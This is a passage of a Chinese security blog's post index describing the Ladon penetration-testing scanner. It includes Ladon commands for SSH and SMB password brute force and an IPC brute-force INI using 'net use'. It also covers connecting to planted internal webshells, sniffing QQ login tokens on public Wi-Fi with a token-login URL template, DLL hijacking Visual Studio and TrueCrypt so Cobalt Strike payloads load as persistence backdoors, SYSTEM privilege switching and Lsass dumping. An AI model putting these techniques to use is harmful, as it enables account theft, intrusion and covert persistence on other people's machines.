force","slug":"brute-force","permalink":"http://k8gege.org/tags/brute-force/"}]},{"title":"〖教程〗Ladon网络认证弱口令爆破详解SSH为例","slug":"sshscan","date":"2020-05-18T10:10:00.000Z","updated":"2020-06-06T02:32:35.485Z","comments":true,"path":"p/sshscan.html","link":"","permalink":"http://k8gege.org/p/sshscan.html","excerpt":"","text":"Ladon内置SSH密码爆破SSHscan,支持内外网指定IP、批量IP、批量IP段（C段、B段、A段）、支持CIDR格式，支持自定义SSH端口。支持IP帐密检测(check.txt)，支持帐密组检测(userpass.txt)，支持传统用户密码检测(user.txt、pass.txt),密码爆破前程序会自动检测端口是否开放，无需另外扫描22端口，准备好密码就可以批量爆破。+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ window.location.href=\"http://k8gege.org/Ladon/sshscan.html\"; http://k8gege.org/Ladon/sshscan.html","categories":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/categories/Ladon/"},{"name":"密码爆破","slug":"Brute-Force","permalink":"http://k8gege.org/categories/Brute-Force/"}],"tags":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/tags/Ladon/"},{"name":"brute force","slug":"brute-force","permalink":"http://k8gege.org/tags/brute-force/"},{"name":"ssh","slug":"ssh","permalink":"http://k8gege.org/tags/ssh/"}]},{"title":"Ladon & Cobalt Strike连接内网WebShell","slug":"Ladon webshell","date":"2020-04-26T14:10:00.000Z","updated":"2020-07-18T07:49:06.222Z","comments":true,"path":"p/ladon_cs_shell.html","link":"","permalink":"http://k8gege.org/p/ladon_cs_shell.html","excerpt":"","text":"前言无论是外网渗透还是内网渗透，为了能够长期控制权限，都会留下各类后门。WebShell无额外进程、无额外端口、不主动向外连接的后门使用频率非常高。外网的有很多管理工具不用说了，但是内网有WebShell机器无法上网怎么办？方案1：代理后管理工具访问，缺点代理卡时，无法连接内网WebShell方案2：使用Ladon，无需代理，只要有SHELL就可以连接内网WebShell PS: Shell不只限于WebShell，而是任何可执行命令的，含远控、后门 一键GetShell使用WebLogicExp模块对内网进行Weblogic漏洞扫描并GetShell 批量：Ladon 192.168.1.8/24 WeblogicExp Ladon JspShell123Usage：Ladon JspShell type url pwd cmdExample: Ladon JspShell ua http://192.168.1.8/shell.jsp Ladon whoamiExample: Ladon JspShell cd http://192.168.1.8/shell.jsp Ladon whoami K8-UA马,类型为1或ua（例子WebLogic） 菜刀马,类型为2或cd（例子Struts2） CS JspShellCobalt Strike下Ladon连接内网WebShell，用法和在CMD下一模一样 其它webshell1234Usage：Ladon WebShell ScriptType ShellType url pwd cmdExample: Ladon WebShell jsp ua http://192.168.1.8/shell.jsp Ladon whoamiExample: Ladon WebShell aspx cd http://192.168.1.8/1.aspx Ladon whoamiExample: Ladon WebShell php ua http://192.168.1.8/1.php Ladon whoami 下载CS: https://github.com/k8gege/AggressorLadon: https://github.com/k8gege/Ladon","categories":[{"name":"Cobalt Strike","slug":"CS","permalink":"http://k8gege.org/categories/CS/"},{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/categories/Ladon/"},{"name":"远程执行","slug":"Rce","permalink":"http://k8gege.org/categories/Rce/"},{"name":"内网渗透","slug":"Lan-Pentest","permalink":"http://k8gege.org/categories/Lan-Pentest/"}],"tags":[{"name":"Cobalt Strike","slug":"CS","permalink":"http://k8gege.org/tags/CS/"},{"name":"WebShell","slug":"WebShell","permalink":"http://k8gege.org/tags/WebShell/"}]},{"title":"超过8年依然可用的QQkey免密登陆漏洞","slug":"qqskey","date":"2020-04-23T15:10:00.000Z","updated":"2020-05-18T14:19:30.692Z","comments":true,"path":"p/qqkey.html","link":"","permalink":"http://k8gege.org/p/qqkey.html","excerpt":"","text":"前言你是否收到好友给你发的H站、赌博等站点的广告信息？没错都是QQKEY的蠕虫，在2012年的时候很疯狂什么QQ空间自动发广告，邮箱自动给好友发广告消息等等，可能你点击里面的广告你的Q也跟着被盗…如果你的号值钱就是以前常说的靓号，盗号者还会改你的信息卖你的QQ，当然现在也就只能发广告了前几年可能也被电信诈骗利用，毕竟能通过资料或好友备注等很多信息，增加诈骗你好友钱的可信度 什么是QQkey不管是ClinetKey还是skey在这里我统称它为QQKEY吧，他俩是有区别的，但对于最终目的我们都是登陆。比如说钥匙，长得不一样，售价不一样，开锁难度不一样，但它一样是锁，叫法或卖的价钱不一样而已。 无论是ClinetKey还是skey都是一张临时登陆的身分证，可理解为腾讯对特定字符串（cookie）的定义ClientKey大家有没注意到当你登陆QQ后，访问QQ的相关站点，无需输入QQ密码即可自动登陆相关站点？能自动登陆说明肯定有令牌，总不可能给你存密码，因此我们可以通过特定网页获取到QQKEY免密登陆。 发帖前我又测了一下2014年的QQKEY利用程序，确认依然存在,如QQ邮箱、QQ安全中心均可直接KEY登陆 获取内网QQkey由于腾讯对QQ做了异地登陆限制，需手机解锁等操作，相对来说也是顶安全的，但在公共场所就不一样了。使用Ladon的HTTP嗅探功能，可轻松嗅探到局域网或公共场所中的QQ和SKEY，比如在网吧、学校、星巴克等在公共场所获取到的QQ肯定是别人当前可登陆的，所以登陆地IP限制就不存在了，嗅到SKEY可直接登陆Ladon获取SKEY的方法非常简单，命令Ladon HttpSniffer 192.168.1.8(本机IP)，坐等即可。该功能在Ladon添加嗅探功能时就有,去年的12月份Ladon 6.0及以后版本均可以 QQkey登陆邮箱http://ptlogin2.qq.com/jump?clientuin=QQ&amp;clientkey=key&amp;keyindex=9&amp;u1=https%3A%2F%2Fmail.qq.com%2Fcgi-bin%2Flogin%3Fvt%3Dpassport%26vm%3Dwpt%26ft%3Dloginpage%26target%3D&amp;pt_local_tk=&amp;pt_3rd_aid=0&amp;ptopt=1&amp;style=25 PS: 其它业务自行抓包获取URL，网上也公开很多ClientKeyt和Skey的利用工具，最新的是今年3月底 参考https://blog.csdn.net/qq_38837337/article/details/80673809 警告本文主要是告诉大家不要在使用公共WIFI登陆QQ，其实微信或其它应用也同理","categories":[{"name":"密码","slug":"Pass","permalink":"http://k8gege.org/categories/Pass/"}],"tags":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/tags/Ladon/"}]},{"title":"持久化后门之微软Visual Studio开发工具DLL劫持","slug":"vs dllhijack","date":"2020-04-22T15:58:00.000Z","updated":"2020-04-23T10:22:10.810Z","comments":true,"path":"p/28288.html","link":"","permalink":"http://k8gege.org/p/28288.html","excerpt":"","text":"DLL劫持&amp;白加黑DLL劫持在白加黑里最常见，07、08年开始在国内才开始起步，但主要是写病毒用到的较多，什么LPK.DLL、USP10.DLL都是当时流行的U盘病毒木马最喜欢用的劫持方式，因为它们可以劫持99%的EXE，10年后渗透圈才开始懂利用，常见的只是单纯用于提权而已。很多人在很多方面不懂举一反三，能执行添加用户命令，你就不懂让它执行远控上线了吗？一定要登3389? 目前还不能完全避免此漏洞，特别是应用软件们的，通过DLL劫持来绕过安全软件主动防御的保护被称为“白加黑”，因为加载的主程序是正常的软件，主动防御可能会放过它，允许它启动，而恶意DLL则通过该软件的漏洞或替换正常的同名文件（对应用软件的文件保护似乎并不象对系统文件保护那样严密，而且并不是一直运行状态，被替换还是比较容易的）， 甚至有的还会冒用合法软件的数字签字等方式，由正常程序加载，从而躲开安全软件的拦截。 当然可能有些人对白加黑有误解，以为非要劫持系统的才叫白加黑，实际APT里最常用的一些方法是，劫持第3方程序。比如360、讯雷、WinRar、Chrome、Office系列等存在DLL劫持，人家给你发送的马包含被劫持程序和对应DLL，运行正常的程序即可绕过主防上线。如海莲花等APT常用WINWORD.EXE加wwwlib.dll方式上线，因为EXE是WORD里的原版程序，有签名又合法它启动，杀软不拦，由于启动时会加载wwwlib.dll（什么C2或CS啊加密存在DLL里，海莲花常用的是CS），它就上线了，这也是白加黑利用。因为并不是所有人都安装WORD，而且安装的版本不定存在这个劫持，所以它必须捆绑EXE在里面，而这个合法的EXE可以是任何第3方程序。 VS劫持将K8测试专用DLL劫持工具里的DLL改名成SspiCli.dll后放入VS目录运行VS即可，劫持对象VS2008-VS2015主程序devenv，VS2019已修复其它不只主程序，只是时间太久了，我忘了懒得测，大家自行测试 劫持VS2015 劫持VS2012 劫持VS2010 劫持VS2008 POChttps://github.com/k8gege/K8tools/raw/master/K8dllhijack.rar 持久化如CobalStrike生成DLL改名为SspiCli.dll，用户打开VS时即可上线 PS: 2016年在网易有发过，发现网上已搜不到，重新发一下Notepad++ DLL劫持 参考Notepad++ 修复被 CIA 利用的 DLL 劫持https://www.sohu.com/a/129080133_466846[提权]Notepad++ DLL劫持漏洞https://bbs.mayidui.net/t219-e.html 扯个淡几年前看过我网易博客甚至百度博客的时候会发现，我经过发提权或者DLL劫持的文章，那时候我不需要和别人说持久化人家就懂得如何利用用在哪方面，一张图片就够，而近几年你一定要和人家说一样的名词，不然TMD人家听不懂。不信大家看我19年用博客园时DLL劫持的文章并没多少人看，而以前大家对DLL劫持和提权的关注都是差不多的，这就是最明显的一点。当然也和很多人不会编程或写马有关系，你告诉人家哪个DLL能劫持的，他也没法利用，不关注也很正常。","categories":[{"name":"持久化","slug":"Persistence","permalink":"http://k8gege.org/categories/Persistence/"},{"name":"DLL劫持","slug":"DllHijack","permalink":"http://k8gege.org/categories/DllHijack/"}],"tags":[{"name":"DllHijack","slug":"DllHijack","permalink":"http://k8gege.org/tags/DllHijack/"}]},{"title":"持久化后门之加密工具TrueCrypt DLL劫持","slug":"truecrypt dllhijack","date":"2020-04-22T15:55:00.000Z","updated":"2020-04-23T10:22:25.180Z","comments":true,"path":"p/26141.html","link":"","permalink":"http://k8gege.org/p/26141.html","excerpt":"","text":"简介TrueCrypt，是一款免费开源的加密软件，同时支持Windows Vista,7/XP, Mac OS X, Linux 等操作系统。TrueCrypt不需要生成任何文件即可在硬盘上建立虚拟磁盘，用户可以按照盘符进行访问，所有虚拟磁盘上的文件都被自动加密，需要通过密码来进行访问。TrueCrypt 提供多种加密算法，包括：AES-256, Blowfish (448-bit key), CAST5, Serpent, Triple DES, and Twofish，其他特性还有支持FAT32和NTFS分区、隐藏卷标、热键启动等。 软件荣誉FBI在经过一年的尝试后，还是未能破译被巴西执法机构指控金融犯罪的巴西银行家的加密文件。巴西一家葡萄牙语报纸报道（葡萄牙语），巴西联邦警察在2008年7月展开的Satyagraha行动中，在银行家Daniel Dantas位于里约热内卢的公寓内收缴了5个硬盘。文章提到硬盘使用了两种加密程序，一种是TrueCrypt，另一种是不知名的256位AES加密软件。在专家未能破解密码后，巴西政府在2009年初请求美国提供帮助，然而美国联邦警察在一年不成功的尝试后，退还了硬盘。巴西现有的法律中不存在强制要求Dantas交出密码的规定。 TC劫持将K8测试专用DLL劫持工具里的DLL改名成RichEd20.dll后放入TC目录运行TrueCrypt目录下的3个EXE均会被劫持，成功弹出被劫持相关信息 POChttps://github.com/k8gege/K8tools/raw/master/K8dllhijack.rar 利用如CobalStrike生成DLL改名为RichEd20.dll，用户打开TC时即可上线 PS: 2016年在网易有发过，发现网上已搜不到，重新发一下，除了让别人知道，也防止自己未来老年痴呆，被刚入门的利用TC持久化就蛋疼了，因为我喜欢用。他搞你后还来一句，你看这SB这么简单的东西，他天天用都不知道我加了后门 Notepad++ DLL劫持 参考Notepad++ 修复被 CIA 利用的 DLL 劫持https://www.sohu.com/a/129080133_466846[提权]Notepad++ DLL劫持漏洞https://bbs.mayidui.net/t219-e.html","categories":[{"name":"持久化","slug":"Persistence","permalink":"http://k8gege.org/categories/Persistence/"},{"name":"DLL劫持","slug":"DllHijack","permalink":"http://k8gege.org/categories/DllHijack/"}],"tags":[{"name":"DllHijack","slug":"DllHijack","permalink":"http://k8gege.org/tags/DllHijack/"}]},{"title":"Ladon 6.4新增Linux系统探测、管理员提权System降权","slug":"Ladon 6.4","date":"2020-04-20T15:55:00.000Z","updated":"2020-06-04T12:31:09.713Z","comments":true,"path":"p/55476.html","link":"","permalink":"http://k8gege.org/p/55476.html","excerpt":"","text":"前言你还在为权限切换的问题而烦恼吗？SYSTEM权限下浏览器密码读取工具失效？SYS权限下系统自带NET USE命令连接IPC失效？SYSTEM权限下截取不到目标桌面？ADMIN权限下打不开SYSTEM权限进程？如何切换各种权限测试工具？等这些都是权限问题，在XP和03用户权限和SYS权限都是同一个会话，所以远控可直接记录到，很多功能我们也没发现影响，直到WIN7微软为了这全，将会话进行隔离，我们会发现SYS权限会话为0，用户为1，这就是为什么以前sys权限控制WIN7机器远程桌面会黑屏的原因?Firefxo和Chrome采用了DBAPI加密，该加密需要对应用户会话信息才能解密，直接以SYSTEM权限启动发现解密失败。所以我们需要切换权限 Ladon 6.4更新功能5.2[u] 修复noping参数问题(误注释了一行代码导致)4.27[+] Ping/PingIP 仅ICMP探测IP速度快(3-6秒/C段,5.8前的OnlinePC)[+] CheckDoor 检测后门(网上公开多年的)–OCI.DLL/5个注册表RUN[u] OsScan 修复6.2 4.20后osscan无法使用的BUG[+] ipcscan.ini INI插件之Ipc密码爆破(net use)[+] smbscan.ini INI插件之Smb密码爆破(impacket)[+] smbhash.ini INI插件之NtlmHash爆破(impacket) 4.26[+]JspShell 横向移动连接内网webshell执行命令 4.20[+] GetSystem 管理员/SYSTEM权限切换[+] DumpLsass 导出Lsass内存文件[u] OsScan新增SSH识别操作系统[u] WebScan、SameWeb新增WebBanner[+] WhatCms新增Banner、TP-Link WDR7300识别[u] 修复6.3漏扫10、20等含0的C段 提权 以SYSTEM权限执行命令：Ladon GetSystem cmd.exe命令：Ladon GetSystem cmd.exe /system命令：Ladon GetSystem cmd.exe lsass可指定EXE或BAT，将以SYSTEM权限运行，如下图弹个CMD 注意：需管理员权限，若存在UAC可使用BypassUac获取管理员 当然也可以使用系统AT、SCHTASKS等命令获取SYSTEM权限，不担心被杀，只是麻烦点，看Ladom多简单 降权 以用户权限执行SYSTEM权限下并不是什么都可以做，比如大家用Ladon或其它工具弹出个SYS权限CMD，再试一下系统自带的NET USE命令连接IPC看提示什么，你会发现明明密码是正确的但是却提示错误。为何需提权、降权我在14年已发布命令：Ladon GetSystem cmd.exe /user命令：Ladon GetSystem cmd.exe explorer PS: 当然也可以切换至任意权限，指定对应进程即可，如降权到服务权限等 DumpLsass内存密码Dump Lsass内存文件，取回本地读取密码，无需免杀MIMI Ping命令: Ping 或 PingIP 仅ICMP协议探测存活主机（速度快3-6秒/ C段，5.8版本前的OnlinePC） Ipc密码爆破INI插件：调用系统net use命令进行IPC爆破，由于系统限制只能连接一个，因此只能验证一个密码结束后，才能对下一个密码进行验证，而且必须删除连接，以上因素导致用系统命令爆破速度会很慢，因为你无法多线程一下就验证多个密码，所以Ladon内置模块不再保留IpcScan，使用分破4万密码的SmbScan可快速验证密码或者调用impacket的smbexec验证速度要比net use也快很多。 PS：此模块的存在主要是用于针对2003或XP系统的Ipc爆破，远程为Win7后系统推荐使用内置SmbScan爆破 ipcscan.ini 12345678[Ladon]#Brute-Force IPC(445) PassWord exe=cmd.exearg=net use \\\\$ip$ /user:$user$ $pass$ &amp; net use \\\\$ip$ /del#isok=The command completed successfullyisok=命令成功完成port=445log=true 扫描C段 1Ladon 192.168.1.8/c ipcscan.ini 工具下载最新版本：https://k8gege.org/Download历史版本: https://github.com/k8gege/Ladon/releases","categories":[{"name":"提权","slug":"Lpe","permalink":"http://k8gege.org/categories/Lpe/"},{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/categories/Ladon/"}],"tags":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/tags/Ladon/"},{"name":"Tool","slug":"Tool","permalink":"http://k8gege.org/tags/Tool/"}]},{"title":"Ladon中28种探测存活主机方法(含绕过防火墙探测)","slug":"Ladon绕过防火墙探测存活主机方法","date":"2020-04-02T15:00:00.000Z","updated":"2020-06-11T16:19:24.825Z","comments":true,"path":"p/48225.html","link":"","permalink":"http://k8gege.org/p/48225.html","excerpt":"","text":"前言内网渗透中，最重要的一步就是探测在线机器，只有先探测到机器接下来才是探测操作系统、扫描端口服务、开放WEB、扫描漏洞等。目标不开机，你搞啥呢？当然也有一种情况，目标开机但却扫不到这是因为目前大部份扫描器使用PING扫描，而防火墙默认是拦截的默认条件下也不放行其它端口，比如SMB、RDP、HTTP等协议也不行那能不能在防火墙完全防护状态下探测存活机器呢？答案是有的。 测试环境Win7-A: 192.168.1.20 测试防火墙Win7-B: 192.168.1.7 Ladon扫描器 实验1：A机器关闭防火墙实验2：A机器开启防火墙实验3：A机器关机 PS：整个过程中B机器防火墙需关闭，因为要保证所有协议都能进出B机器才能测试防火墙开启或关闭的情况下，分别有哪些协议可以探测存活主机 A关闭防火墙ICMP协议可达目标机器，即可PING通A机器Ladon 192.168.1.1/24 OnlinePC=============================================ICMP: 192.168.1.7 00-0C-00-00-00-90 Win-K8gege VMwareICMP: 192.168.1.4 00-0C-00-00-00-1C VMwareICMP: 192.168.1.30 08-1F-00-00-00-EA Tp-LinkICMP: 192.168.1.1 94-28-00-00-00-4E NewH3CICMP: 192.168.1.20 00-0C-00-00-00-50 VMware=============================================OnlinePC:5 A开启防火墙ICMP协议不可达目标机器，即无法PING通A机器，但是MAC可以Ladon 192.168.1.1/24 OnlinePC=============================================ICMP: 192.168.1.7 00-0C-00-00-00-90 Win-K8gege VMwareICMP: 192.168.1.1 94-28-00-00-00-4E NewH3CICMP: 192.168.1.30 08-1F-00-00-00-EA Tp-LinkICMP: 192.168.1.4 00-0C-00-00-00-1C VMware MAC: 192.168.1.20 00-0C-00-00-00-50 VMwareICMP: 192.168.1.2 38-AD-00-00-00-1F NewH3C=============================================OnlinePC:6 A机器关机A机器关机后，发现无法探测MAC，说明能获取到MAC，机器肯定在线Ladon 192.168.1.1/24 OnlinePC=============================================ICMP: 192.168.1.7 00-0C-00-00-00-90 Win-K8gege VMwareICMP: 192.168.1.1 94-28-00-00-00-4E NewH3CICMP: 192.168.1.4 00-0C-00-00-00-1C VMwareICMP: 192.168.1.30 08-1F-00-00-00-EA Tp-LinkICMP: 192.168.1.2 38-AD-00-00-00-1F NewH3C=============================================OnlinePC:5 结论开机状态下，开启系统防火墙后，无法PING通机器（默认配置）但可获取远程机器MAC，因此可通过MAC探测目标主机是否存活 疑问1.有人问我Ladon扫描出来的存活机器，为何PING不通呢?是不是不准？答：首先机器存活，但相关端口未开放，如3389没开,你当然连不上。同理防火墙默认根本不允许ICMP协议通过，你PING不通很正常。Ladon通过其它方式探测到存活，而非单纯的ICMP，PING不通并不代表关机上面的实验结果已充分说明，用其它工具扫描可能会漏掉禁PING机器 2.有人问我为什么新版的OnlinePC比之前慢了，以前3秒可扫一个C段。再重复一次，Ladon的OnlinePC不只是单纯的通过ICMP检测存活主机。打个比方一个人自己开车去北京，中途车坏了他就不去了，事情结束如果车坏了，找人来修或换乘轮船，最后到达北京时间是不是多了。新版的先PING机器,不通并没有结束，而是再尝试使用其它协议探测最简单的一个问题，你是想要扫描结果更准更多，还是结果少速度快再者以前可能3秒至几秒，现在可能几秒至13秒，才多几秒钟也不慢啊 以上两个问题是我发此文章的主要原因，怕还会有很多人问同样的问题 28种方法Ladon以下模块均可用于探测存活主机，不要死板的只用OnlinePC或者只用其它只是用PING来扫描的工具，得到的结果错过很多机器可根据实际情况使用以下模块探测存活主机，如WAF禁用HTTP协议采用HTTP协议的模块就不要用了，即便同样是HTTP，模块结果不同如WhatCMS识别到CMS才回显，WebScan还会返回HttpBanner。所以同个协议，有些模块扫不出东西，不代表防火墙禁止该协议。 如大家最容易理解的扫445端口发现不开放，不代表TCP协议禁用因为人家怕你用MS17010漏洞一键GETSHELL，所以禁止了共享而已如果要精准探测存活主机，就得使用多个方式才能深入拓展内网 ID 模块名称 功能说明 采用协议 用法 1 OnlinePC 存活主机信息 ICMP、MAC、DNS Ladon 192.168.1.1/24 OnlinePC 2 OnlineIP 存活主机(IP) ICMP、MAC、DNS Ladon 192.168.1.1/24 OnlineIP 3 UrlScan URL域名扫描 HTTP Ladon 192.168.1.1/24 UrlScan 4 SameWeb 同服域名扫描 HTTP Ladon 192.168.1.1/24 SameWeb 5 WebScan Web信息扫找 HTTP Ladon 192.168.1.1/24 WebScan 6 HostIP 主机名解析 DNS Ladon Win-K8gege HostIP 7 DomainIP 域名解析 DNS Ladon k8gege.org DomainIP 8 OsScan 操作系统版本 MAC、DNS、SMB、HTTP、RDP、TCP等 Ladon 192.168.1.1/24 OsScan 9 PortScan 扫描Banner TCP Ladon 192.168.1.1/24 PortScan 10 WhatCMS Web指纹识别 HTTP Ladon 192.168.1.1/24 WhatCMS 11 CiscoScan 思科扫描 HTTP、TCP Ladon 192.168.1.1/24 CiscoScan 12 EnumMssql MSSQL主机 MSSQL Ladon EnumMssql 13 EnumShare 共享主机 SMB Ladon EnumShare 14 LdapScan LDAP主机/389端口/密码爆破 LDAP、TCP Ladon 192.168.1.1/24 LdapScan 15 FtpScan FTP主机/21端口/密码爆破 FTP、TCP Ladon 192.168.1.1/24 FtpScan 16 SmbScan 445端口/密码爆破 SMB、TCP Ladon 192.168.1.1/24 SmbScan 17 WmiScan 135端口/密码爆破 WMI、TCP Ladon 192.168.1.1/24 WmiScan 18 SmbHash 445端口/密码爆破 SMB、TCP Ladon 192.168.1.1/24 SmbHash 19 WmiHash 135端口/密码爆破 WMI、TCP Ladon 192.168.1.1/24 WmiHash 20 SshScan 22端口/密码爆破 SSH、TCP Ladon 192.168.1.1/24 SshScan 21 MssqlScan 1433端口/密码爆破 MSSQL、TCP Ladon 192.168.1.1/24 MssqlScan 22 OracleScan 1521端口/密码爆破 Oracle、TCP Ladon 192.168.1.1/24 OracleScan 23 MysqlScan 3306端口/密码爆破 MYSQL、TCP Ladon 192.168.1.1/24 MysqlScan 24 VncScan 5900端口/密码爆破 VNC、TCP Ladon 192.168.1.1/24 VncScan 25 MS17010 MS17010漏洞检测 TCP、SMB Ladon 192.168.1.1/24 MS17010 26 AdiDnsDump 域内存活机器 DNS、LDAP Ladon AdiDnsDump 域机器IP 27 FtpSniffer Ftp密码嗅探 FTP Ladon FtpSniffer 192.168.1.8 28 HttpSniffer HTTP密码嗅探 HTTP Ladon HTTPSniffer 192.168.1.8 PS: Ladon 6.2开始密码爆破模块，在无帐密文件的情况下，仅探测协议或对应端口当然所有密码爆破均可自定义端口爆破，但自定义端口可能只支持一台不支持批量具体看Ladon对应模块的详细文档,嗅探模块嗅探出HTTP或FTP帐密同时也证明其存活 Browser协议无意发现browser协议中含有机器名、系统版本,发包时间随机，有些2-12分钟除了上述方法外，Browser协议也可以用于探测存活主机，不过是基于嗅探基于Browser协议探测内网主机，详见：http://k8gege.org/p/16b5ff0b.html 工具下载最新版本：https://k8gege.org/Download历史版本: https://github.com/k8gege/Ladon/releases","categories":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/categories/Ladon/"},{"name":"内网渗透","slug":"Lan-Pentest","permalink":"http://k8gege.org/categories/Lan-Pentest/"},{"name":"主机发现","slug":"OnlinePC","permalink":"http://k8gege.org/categories/OnlinePC/"},{"name":"信息收集","slug":"Discover","permalink":"http://k8gege.org/categories/Discover/"}],"tags":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/tags/Ladon/"}]},{"title":"Ladon 6.2新增Ntlm Hash爆破每分钟可破4万个密码","slug":"Ladon 6.2","date":"2020-03-30T11:00:00.000Z","updated":"2020-06-04T12:31:21.048Z","comments":true,"path":"p/39070.html","link":"","permalink":"http://k8gege.org/p/39070.html","excerpt":"","text":"前言天下武功,无坚不破,唯快不破。扫描速度 SMB &gt; Wmi ，但是SMB通不代表WMI通。每秒700个左右，换句话说你只收集到500个密码，验证一个C段也就一分钟左右。 Ladon6.2更新功能ID | 模块名称 | 功能说明 | 返回结果-|-|-|-|-0 | OnlinePC | 存活主机扫描 | 存活IP、Mac地址、机器名、设备制造商1 | SmbHashScan | SMB HASH密码爆破(Windows) | 检测过程、成功密码、LOG文件 |2 | WmiHashScan | WMI HASH密码爆破(Windows) | 检测过程、成功密码、LOG文件 |3 | BypassUac | 绕过UAC执行,支持Win7-Win10 | Ladon BypassUac c:\\1.exe4 | EnableDotNet | 一键启用.net 3.5(2008系统默认未启用) | Ladon EnableDotNet5 | gethtml | 获取内网站点HTML源码 | Ladon gethtml http://192.168.1.16 | AdiDnsDump | 域内机器信息获取(非域内请使用LdapScan探测) | IP、域名7 | LdapScan | 不指定密码时，仅探测LDAP服务器 | IP是否LDAP服务器8 | FtpScan | 不指定密码时，仅探测FTP服务器 | IP是否FTP服务器9| Ladon.cna | CobaltStrike 3.x-4.0右键菜单 | 一键扫描内网10 命令支持CIDR格式IP扫描11 INI配置支持自定义密码爆破12 PortScan命令行支持自定义端口 BUG修复修复SmbScan遇到%非数字密码停止的BUG修复一些模块扫描TXT列表崩溃的BUG修复LdapScan扫描check.txt只检测一个的bug SmbHash密码爆破 WmiHash密码爆破 LDAP服务器识别目录下无帐密或相关文件时，使用LDAP协议探测服务器。 Ftp服务器识别目录下无帐密或相关文件时，使用FTP协议探测服务器。 自定义密码爆破详见：http://k8gege.org/p/53177.html OnlinePC存活主机 PortScan端口扫描命令行支持自定义端口，而不是非要ports.txt指定端口Ladon 192.168.1.8-192.168.1.200 PortScan 22,80,1433,21,3306,1521 工具下载最新版本：https://k8gege.org/Download历史版本: https://github.com/k8gege/Ladon/releases","categories":[{"name":"Kali","slug":"Kali","permalink":"http://k8gege.org/categories/Kali/"},{"name":"密码","slug":"Pass","permalink":"http://k8gege.org/categories/Pass/"},{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/categories/Ladon/"}],"tags":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/tags/Ladon/"},{"name":"Tool","slug":"Tool","permalink":"http://k8gege.org/tags/Tool/"},{"name":"Kali","slug":"Kali","permalink":"http://k8gege.org/tags/Kali/"},{"name":"Scanner","slug":"Scanner","permalink":"http://k8gege.org/tags/Scanner/"}]},{"title":"Ladon for MacOS","slug":"Ladon for MacOS","date":"2020-03-30T04:50:00.000Z","updated":"2020-06-04T12:32:13.416Z","comments":true,"path":"p/60379.html","link":"","permalink":"http://k8gege.org/p/60379.html","excerpt":"","text":"前言在尘封已久的笔记本上安装mono后测试Ladon，确实支持苹果系统。当初没环境一直没测，和大家说理论上支持，现已证实。 测试环境：Mac 10.15.3mono 6.6.0.166一不小心装的都是最新版，大家也可以在现有版本上测试，应该都是支持的。使用方法和kali下使用一样，下载KaliLadon将其改名Ladon，在执行Ladon时在前面加上mono即可 程序简介Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。5.7版本内置40个功能模块,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息，漏洞检测包含MS17010、Weblogic、ActiveMQ、Tomcat、Struts2等，密码爆破11种含数据库(Mysql、Oracle、MSSQL)、FTP、SSH(Linux主机)、VNC、Windows密码(IPC、WMI、SMB)、Weblogic后台、Rar压缩包密码等，Web指纹识别模块可识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。 使用简单虽然Ladon功能丰富多样,但使用却非常简单,任何人都能轻易上手只需一或两个参数就可用90%的功能,一个模块相当于一个新工具 测试环境Mac 10.15.3mono 6.6.0.166 安装monolinux下需mono运行环境，Kali和Ubuntu安装命令通用。其它系统未进行测试，喜欢用其它Linux系统自行测试。 1apt install mono-runtime 运行Ladon1mono Ladon OnlinePC 可用功能由于mono的兼容性问题，不保证苹果下所有功能均可用就对于Ladon功能的测试来看Kali的兼容性要比Ubuntu好测试发现有些功能的稳定性以及速度没有Windows系统快未列功能系未测试或暂不可用功能，使用前请先看说明在Kali 2019.4下测试，Ladon支持以下所列的27种功能============================================= ID 模块 说明 1 WebDir Web目录扫描 2 UrlScan URL域名扫描（不验IP） 3 PhpStudyPoc PhpStudy后门扫描 4 WebScan Web信息扫描 5 MysqlScan Mysql口令检测 6 OracleScan Oracle口令检测 7 VncScan Vnc口令检测 8 HttpDownLoad Http下载 9 FtpDownLoad Ftp下载 10 WhatCMS 75种CMS识别 11 FtpScan Ftp口令检测 12 PortScan PortScan端口扫描 13 SmbScan Smb口令检测 14 SameWeb 站点域名扫描（验证IP） 15 MS17010 MS17010漏洞扫描 16 OnlinePC 存活主机扫描 17 OnlineIP 存活主机IP扫描 18 HostIP 主机名解析IP 19 DomainIP 子域名解析IP 20 EnBase64 批量Base64密码加密 21 DeBase64 批量Base64密码解密 22 EnHex 批量Hex密码加密 23 DeHex 批量Hex密码解密 24 OsScan 系统版本探测 25 SubDomain 子域名爆破 26 SshScan SSH口令检测 27 *.ps1 无PowerShell执行脚本 暂不支持功能=============================================Struts2Poc X不支持TomcatScan X不支持HttpBasicScan X不支持，只能检测是否401认证URL，无法爆破WeblogicPoc X 竟然不支持(Win下mono也不支持，显然mono问题)MssqlScan X不支持只能扫到开放端口IpcScan X不支持(因为调用cmd命令) MacOS功能实测由于环境少原因，仅测了以下功能，其它模块请自行测试。可用功能应该和在Kali下可使用差不多，如不可用可反馈。 MS17010漏洞扫描 OsScan系统探测 UrlScan、Base64加解密 webScan/SameWeb网站信息扫描 工具下载最新版本：https://k8gege.org/Download历史版本: 